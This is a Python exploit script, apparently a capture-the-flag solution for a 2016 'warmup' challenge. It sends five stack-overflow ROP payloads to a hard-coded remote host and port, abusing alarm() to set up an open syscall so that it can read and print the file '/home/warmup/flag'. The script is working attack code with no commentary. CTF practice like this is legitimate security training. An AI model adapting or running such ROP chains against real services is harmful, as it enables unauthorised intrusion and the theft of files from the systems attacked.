#!/usr/bin/env python
from sc_pwn import *

#target     = {'host':'192.168.75.129','port':8080}
target     = {'host':'202.120.7.207','port':52608}

addr_vuln           = 0x0804815a
addr_alarm          = 0x0804810d
addr_read           = 0x0804811d
addr_write          = 0x08048135
addr_exit           = 0x0804814d
addr_syscall_arg3   = 0x08048122
addr_buf            = 0x0804920c

str_fname           = '/home/warmup/flag\x00'
sys_open            = 0x05

#==========
def attack(cmn):    
    exploit_st1  = '\x00'*0x20
    exploit_st1 += pack_32(addr_read)
    exploit_st1 += pack_32(addr_vuln)
    exploit_st1 += pack_32(STDIN_FILENO)
    exploit_st1 += pack_32(addr_buf)
    exploit_st1 += pack_32(len(str_fname))

    exploit_st2  = '\x00'*0x20
    exploit_st2 += pack_32(addr_alarm)
    exploit_st2 += pack_32(addr_vuln)
    exploit_st2 += pack_32(sys_open)

    exploit_st3  = '\x00'*0x20
    exploit_st3 += pack_32(addr_alarm)
    exploit_st3 += pack_32(addr_syscall_arg3)
    exploit_st3 += pack_32(addr_vuln)
    exploit_st3 += pack_32(addr_buf)
    exploit_st3 += pack_32(O_RDONLY)

    exploit_st4  = '\x00'*0x20
    exploit_st4 += pack_32(addr_read)
    exploit_st4 += pack_32(addr_vuln)
    exploit_st4 += pack_32(3)
    exploit_st4 += pack_32(addr_buf)
    exploit_st4 += pack_32(0x100)

    exploit_st5  = '\x00'*0x20
    exploit_st5 += pack_32(addr_write)
    exploit_st5 += pack_32(addr_exit)
    exploit_st5 += pack_32(STDOUT_FILENO)
    exploit_st5 += pack_32(addr_buf)
    exploit_st5 += pack_32(0x100)

    cmn.read_until('2016!\n')
    cmn.send(exploit_st1)
    cmn.read_until('Good Luck!\n')
    cmn.send(str_fname)
    cmn.send(exploit_st2)
    cmn.read_until('Good Luck!\n')
    cmn.send(exploit_st3)
    cmn.read_until('Good Luck!\n')
    cmn.send(exploit_st4)
    cmn.read_until('Good Luck!\n')
    cmn.send(exploit_st5)
    cmn.read_until('Good Luck!\n')

    flag = cmn.read_until('\n')
    info('flag : %s' % flag)

#==========

if __name__=='__main__':
    cmn = Communicate(target,mode='RAW')
    attack(cmn)
    del(cmn)
    
    raw_input()
    
#==========
